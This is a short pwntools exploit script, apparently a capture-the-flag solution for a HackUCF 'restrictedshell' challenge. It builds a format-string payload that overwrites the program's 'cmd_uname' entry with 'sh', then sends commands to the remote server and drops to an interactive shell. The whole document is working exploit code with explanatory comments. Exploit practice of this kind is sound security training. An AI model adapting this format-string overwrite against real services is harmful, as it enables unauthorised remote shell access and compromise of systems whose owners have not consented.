#Import pwntools
from pwn import *

#Setup the remot connection
conn = remote("ctf.hackucf.org", 7007)

#This establishes the binary which we will be pulling the symbols from
bin = ELF("restrictedshell")

context(binary=bin)

#This constructs the fromat string payload, and then prints it out
payload = fmtstr_payload(5, {bin.symbols["cmd_uname"]: u32("sh\0\0")})
print payload
 
#This sends "prompt" to the server so we can send exploit the vulnerabillity
conn.sendline("prompt")

#Now we send the payload
conn.sendline(payload)

#Now we just have to run the new uname, so we can get a shell
conn.sendline("uname")

#And now we drop to an interactive shell
conn.interactive()


